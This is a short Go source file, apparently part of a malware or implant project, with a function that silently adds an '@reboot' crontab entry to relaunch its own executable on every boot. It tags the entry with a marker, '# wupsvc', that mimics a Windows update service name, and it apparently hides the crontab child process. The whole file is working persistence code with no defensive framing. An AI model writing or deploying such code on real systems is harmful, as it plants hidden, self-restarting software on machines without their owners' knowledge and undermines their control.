//go:build !windows

package main

import (
	"os"
	"os/exec"
	"strings"
)

const cronMarker = "# wupsvc"

func installPersistence() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	cmd := exec.Command("crontab", "-l")
	cmd.SysProcAttr = getSysProcAttr()
	out, _ := cmd.Output()
	existing := string(out)

	if strings.Contains(existing, cronMarker) {
		return
	}

	entry := "@reboot " + exePath + " " + cronMarker + "\n"
	newCrontab := strings.TrimRight(existing, "\n") + "\n" + entry

	installCmd := exec.Command("crontab", "-")
	installCmd.SysProcAttr = getSysProcAttr()
	installCmd.Stdin = strings.NewReader(newCrontab)
	installCmd.Run()
}
